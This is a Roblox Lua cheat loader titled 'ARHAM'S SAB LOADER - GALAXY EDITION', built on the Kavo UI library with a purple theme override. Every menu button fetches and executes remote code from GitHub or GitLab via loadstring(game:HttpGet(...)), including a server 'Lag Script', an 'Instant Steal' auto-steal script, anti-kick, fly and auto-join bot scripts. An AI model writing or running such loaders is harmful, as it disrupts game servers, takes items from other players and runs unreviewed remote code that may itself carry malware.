local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

-- COLORS: (157, 0, 255) is Neon Purple
local Window = Library.CreateLib("ARHAM'S SAB LOADER - GALAXY EDITION", "DarkTheme")

-- THEME OVERRIDE (Forcing Purple Glow)
for i, v in pairs(game.CoreGui:GetDescendants()) do
    if v:IsA("Frame") then
        v.BackgroundColor3 = Color3.fromRGB(20, 0, 40) -- Deep Space Purple
    elseif v:IsA("TextLabel") or v:IsA("TextButton") then
        v.TextColor3 = Color3.fromRGB(180, 50, 255) -- Glowing Neon Purple
    end
end

-- TABS
local MainTab = Window:NewTab("Main Scripts")
local MainSection = MainTab:NewSection("Galaxy Hub")

-- 1. LAG SCRIPT (Updated as requested)
MainSection:NewButton("Lag Script", "Lags the server using khelzzz's source", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/khelzzz/x/refs/heads/main/best-lagger"))()
end)

-- 2. INSTANT STEAL
MainSection:NewButton("Instant Steal", "AutoSteal Items", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AutoStealScript/InstantSteal/refs/heads/main/AutoSteal"))()
end)

-- 3. SAB HUB
MainSection:NewButton("Sab Hub Script", "Vinx-Hub SAB Loader", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vinx-Hub/SAB/refs/heads/main/loader"))()
end)

-- 4. FLY
MainSection:NewButton("Fly Script", "Toggle Flight", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ARUSCRIPT/Script/refs/heads/main/Script.lua",true))()
end)

-- 5. ANTI-KICK
MainSection:NewButton("Anti-Kick", "Prevention System", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mjajas/ANTII/refs/heads/main/antikick.lua"))()
end)

-- 6. TRAX VISUALS
MainSection:NewButton("Trax Visuals", "Galaxy Graphics", function()
    loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
end)

-- 7. MOREIRA SCRIPT
MainSection:NewButton("Moreira Script", "AutoJoin Method", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AutoMoreiraMethodV3/AutoMoreiraV3/refs/heads/main/AutoJoinBots"))()
end)

-- ADDING A NOTIFICATION
Library:Notify("Galaxy Loaded", "Welcome to the Purple Realm, Arham.", Color3.fromRGB(157, 0, 255))
